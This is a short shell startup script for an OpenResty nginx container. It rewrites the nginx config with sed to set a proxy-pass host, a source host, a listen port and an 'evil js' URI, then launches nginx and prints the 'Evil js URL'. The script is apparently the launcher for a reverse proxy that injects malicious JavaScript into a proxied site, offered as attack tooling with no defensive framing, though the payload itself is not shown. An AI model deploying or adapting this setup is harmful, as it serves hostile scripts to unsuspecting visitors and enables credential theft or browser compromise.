#!/bin/sh
echo "[+] Replace evil js URI..."

sed -e 's/7276df76835ed2272cc0e59f55e49902/b026324c6904b2a9cb4b88d6d61c81d1/' \
        -e "18s/proxy.payloads.online/$PROXY_PASS_HOST/g" \
        -e "27s/payloads.online/$PROXY_SOURCE_HOST/g" \
        -e "28s/payloads.online/$PROXY_SOURCE_HOST/g" \
        -e "19s/80/$NGINX_LISTEN_PORT/g" /usr/local/openresty/nginx/conf/nginx.conf > /usr/local/openresty/nginx/conf/nginx.conf.new
mv /usr/local/openresty/nginx/conf/nginx.conf.new /usr/local/openresty/nginx/conf/nginx.conf

echo "[+] Replace server name : $PROXY_PASS_HOST"

echo "[+] Listen PORT : $NGINX_LISTEN_PORT"
echo "[+] Proxy Pass Host : $PROXY_SOURCE_HOST"

echo "[+] Evil js URL :  $PROXY_PASS_HOST/$EVIL_JS_URI/static.js"
/usr/local/openresty/nginx/sbin/nginx -g "daemon off;" -c /usr/local/openresty/nginx/conf/nginx.conf